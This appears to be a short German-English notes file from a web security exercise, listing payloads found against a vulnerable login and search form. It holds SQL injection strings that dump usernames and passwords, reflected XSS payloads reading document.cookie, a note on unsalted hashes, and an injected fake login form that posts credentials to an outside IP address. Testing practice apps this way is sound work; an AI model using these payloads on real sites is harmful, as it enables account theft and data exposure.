# SQL Injections
Kann momentan beispielsweise durchgeführt werden, folgendes 
__" OR 1 = 1 #__ in das login-Username feld eingetragen wird wird. Hierdurch bekommt man alle User Zurück geliefert 
anstatt nur einen mit einer spezifischen ID.
Union Attack __%' UNION SELECT passw FROM Users #__ in Suchfeld
Query kann herausgefunden werden, indem man __%'__ in das suchfeld postet oder __"__ in das login-feld
__%' ORDER BY 4--__ to find out how many columns are in the table since this is important for the attack
__%' UNION SELECT NULL, NULL, username, passw, NULL FROM Users --__ to return userdata

# Cross-Site Scripting
- Reflected XSS
Insert <script>alert();</script>
https://www.imperva.com/learn/application-security/reflected-xss-attacks/#:~:text=Reflected%20XSS%20attacks%2C%20also%20known,enables%20execution%20of%20malicious%20scripts.
https://www.youtube.com/watch?v=T0vxdqvW9fU&list=LL&index=3
<script>alert(document.cookie); </script>
<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
<IMG SRC=j&#X41vascript:alert('test2')>

# Brute-force attack

# Broken Encryption
Möglich wegen veraltetem Hashalgorythmus (SHA256) und weil kein Salt verwendet wird sind alle hashes deterministisch 

# HTML Injections
```html
<h3>Please login to proceed</h3> <form action=http://192.165.159.122>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Login"></br>
```
